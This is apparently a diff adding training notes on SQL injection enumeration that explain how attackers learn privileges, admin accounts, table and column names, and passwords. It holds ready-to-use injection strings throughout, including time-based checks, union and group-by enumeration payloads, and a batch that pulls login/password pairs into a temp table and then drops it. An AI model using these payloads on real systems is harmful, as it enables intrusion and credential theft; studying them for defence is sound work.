@@ -1,0 +1,60 @@
+Attackers use various SQL queries to enumerate database, table names, and columns. 
+
+The information obtained by the attacker after enumeration can be used to obtain sensitive data from the database, modify data (insert/update/delete), execute admin-level operations on the database, and even retrieve the content of a given file present on the DBMS file system
+
+▪ Identify User Level Privilege There are several SQL built-in scalar functions that will work in most SQL implementations: 
+user or current_user, session_user, system_user 
+' and 1 in (select user ) --
+'; if user ='dbo' waitfor delay '0:0:5 '--
+' union select if( user() like 'root@%', 
+benchmark(50000,sha1('test')), 'false' );
+
+
+▪ DB Administrators
+Default administrator accounts include sa, system, sys, dba, admin, root, and many others. 
+
+The dbo is a user that has implied permissions to perform all activities in the database. 
+
+Any object created by any member of the sysadmin fixed server role belongs to dbo automatically.
+
+
+▪ Discover DB Structure Determine table and column names ' group by columnnames having 1=1 --Discover column name types ' union select sum(columnname ) from tablename --Enumerate user defined tables
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') –
+
+
+▪ Column Enumeration in DB o MSSQL
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename') sp_columns tablename
+
+o MySQL show columns from tablename
+
+o Oracle SELECT * FROM all_tab_columns WHERE table_name='tablename'
+
+o DB2 SELECT * FROM syscat.columns WHERE tabname= 'tablename'
+
+o PostgreSQL SELECT attnum,attname from pg_class, pg_attribute WHERE relname= 'tablename' AND pg_class.oid=attrelid AND attnum > 0
+
+
+Password Grabbing 
+
+Password grabbing is one of the most serious consequences of an SQL injection attack.
+
+Attackers grab passwords from user-defined database tables through SQL injection queries. 
+
+The attacker uses his/her tricks of SQL injection and forms an SQL query intended to grab the passwords from the user-defined database tables. 
+
+The attacker may change, destroy, or steal the grabbed password. 
+
+At times, attackers might even succeed in escalating privileges up to the admin level using stolen passwords
+
+For example, attackers may use the following code to grab the passwords: 
+begin declare @var varchar(8000) 
+set @var=':' select @var=@var+' '+login+'/'+password+' ' from users where
+login>@var select @var as var into temp end; --
+' and 1 in (select var from temp) --
+' ; drop table temp --
+
+
+
+
+
+
